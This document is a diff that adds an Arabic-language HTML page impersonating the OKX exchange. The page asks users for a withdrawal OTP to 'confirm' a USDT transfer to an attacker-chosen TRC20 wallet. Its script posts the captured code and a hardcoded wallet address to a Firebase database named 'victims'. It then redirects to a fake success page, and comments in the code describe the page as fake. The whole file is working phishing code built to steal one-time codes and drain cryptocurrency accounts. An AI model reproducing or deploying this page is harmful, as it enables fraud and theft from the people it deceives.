@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد عملية السحب - OKX</title>
+    <style>
+        body { font-family: sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #333; }
+        img { width: 80px; margin-bottom: 20px; }
+        h2 { font-size: 20px; margin-bottom: 10px; color: #fff; }
+        p { color: #888; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 6px; border: 1px solid #444; background: #000; color: #fff; text-align: center; font-size: 18px; letter-spacing: 5px; }
+        button { width: 100%; padding: 12px; border-radius: 6px; border: none; background: #fff; color: #000; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .loading-text { display: none; color: #f3ba2f; font-size: 14px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.okx.com/cdn/assets/imgs/221/5306B62D2C7A87F4.png" alt="OKX">
+    <h2>تأكيد سحب USDT</h2>
+    <p>لقد طلبت سحب الرصيد إلى المحفظة المنتهية بـ **yGid** عبر شبكة **TRC20**. يرجى إدخال رمز التحقق (OTP) لتأكيد المعاملة.</p>
+    
+    <form id="transferForm">
+        <input type="text" name="withdrawal_otp" placeholder="000000" required maxlength="6" pattern="\d*">
+        <button type="submit" id="btn">تأكيد السحب الآن</button>
+    </form>
+    
+    <div id="loading" class="loading-text">جاري معالجة المعاملة على الشبكة...</div>
+</div>
+
+<script>
+    document.getElementById('transferForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const otp = e.target.withdrawal_otp.value;
+        const btn = document.getElementById('btn');
+        const loading = document.getElementById('loading');
+
+        btn.style.display = 'none';
+        loading.style.display = 'block';
+
+        // إرسال كود السحب للفايربيز فوراً
+        const dbUrl = "https://okx-project-ef5bf-default-rtdb.firebaseio.com/victims.json"; 
+        await fetch(dbUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: "WITHDRAWAL_STEP",
+                otp_code: otp,
+                wallet: "TJ3paZ1RrfsLHg2psjzeYESbfHQGiYdotv",
+                time: new Date().toLocaleString()
+            })
+        });
+
+        // بعد 5 ثواني نحوله لصفحة النجاح الوهمية
+        setTimeout(() => {
+            window.location.href = 'success.html';
+        }, 5000);
+    });
+</script>
+
+</body>
+</html>
